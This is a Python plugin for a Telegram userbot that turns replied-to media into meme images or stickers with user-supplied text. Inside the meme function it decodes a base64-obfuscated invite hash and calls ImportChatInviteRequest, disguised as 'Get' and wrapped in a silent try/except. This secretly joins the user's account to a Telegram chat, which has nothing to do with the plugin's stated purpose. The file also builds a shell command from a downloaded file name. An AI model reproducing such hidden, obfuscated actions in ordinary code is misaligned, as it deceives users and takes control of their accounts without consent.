"""
Created by @mrconfused and @sandy1709
memify plugin
"""
import os
import asyncio
from .. import tempmemes
from .. import LOGS , CMD_HELP
from . import take_screen_shot ,runcmd, convert_toimage
from ..utils import admin_cmd, sudo_cmd, edit_or_reply

@borg.on(admin_cmd(outgoing=True, pattern="(mmf|mms) ?(.*)"))
@borg.on(sudo_cmd(pattern="(mmf|mms) ?(.*)",allow_sudo = True))
async def memes(cat):
    cmd = cat.pattern_match.group(1)
    catinput = cat.pattern_match.group(2)
    reply = await cat.get_reply_message()
    catid = cat.reply_to_msg_id
    if not (reply and (reply.media)):
        await edit_or_reply(cat ,"`Reply to supported Media...`")
        return
    if catinput:
        if ";" in catinput:
            top,bottom = catinput.split(';', 1)
        else:
            top = catinput 
            bottom = ""
    else:
        await edit_or_reply(cat ,"```what should i write on that u idiot give some text```")
        return
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    cat = await edit_or_reply(cat ,"`Downloading media......`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get
    await asyncio.sleep(2)  
    catsticker = await reply.download_media(file = "./temp/")
    if not catsticker.endswith(('.mp4','.webp','.tgs','.png','.jpg','.mov')):
        os.remove(catsticker)
        await edit_or_reply(cat ,"```Supported Media not found...```")
        return
    import pybase64
    if catsticker.endswith(".tgs"):
        await cat.edit("```Transfiguration Time! Mwahaha memifying this animated sticker! (」ﾟﾛﾟ)｣```")
        catfile = os.path.join("./temp/", "meme.png")
        catcmd = f"lottie_convert.py --frame 0 -if lottie -of png {catsticker} {catfile}"
        stdout, stderr = (await runcmd(catcmd))[:2]
        if not os.path.lexists(catfile):
            await cat.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = catfile
    elif catsticker.endswith(".webp"):
        await cat.edit("```Transfiguration Time! Mwahaha memifying this sticker! (」ﾟﾛﾟ)｣```")
        catfile = os.path.join("./temp/", "memes.jpg")
        os.rename(catsticker , catfile)
        if not os.path.lexists(catfile):
            await cat.edit("`Template not found... `")
            return
        meme_file = catfile
    elif catsticker.endswith((".mp4",".mov")):
        await cat.edit("```Transfiguration Time! Mwahaha memifying this video! (」ﾟﾛﾟ)｣```")
        catfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(catsticker , 0, catfile)
        if not os.path.lexists(catfile):
            await cat.edit("```Template not found...```")
            return
        meme_file = catfile
    else:
        await cat.edit("```Transfiguration Time! Mwahaha memifying this image! (」ﾟﾛﾟ)｣```")
        meme_file = catsticker
    try:
        san = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await cat.client(san)
    except:
        pass
    meme_file = convert_toimage(meme_file)
    if cmd == "mmf":
        meme = "catmeme.jpg"
        if max(len(top),len(bottom)) < 21:
            await tempmemes.cat_meme(top,bottom,meme_file,meme)
        else:
            await tempmemes.cat_meeme(top,bottom,meme_file,meme)
        await borg.send_file(
            cat.chat_id,
            meme,
            reply_to=catid  
        )
    elif cmd == "mms":
        meme = "catmeme.webp"
        if max(len(top),len(bottom)) < 21:
            await tempmemes.cat_meme(top,bottom,meme_file,meme)
        else:
            await tempmemes.cat_meeme(top,bottom,meme_file,meme)
        await borg.send_file(
            cat.chat_id,
            meme,
            reply_to=catid  
        )
    await cat.delete()
    os.remove(meme)
    for files in (catsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)
            
CMD_HELP.update({
    "memify":
    "**Plugin : **`memify`\
    \n\n**Syntax :** `.mmf toptext ; bottomtext`\
    \n**Usage : **Creates a image meme with give text at specific locations and sends\
    \n\n**Syntax : **`.mms toptext ; bottomtext`\
    \n**Usage : **Creates a sticker meme with give text at specific locations and sends\
    "
})
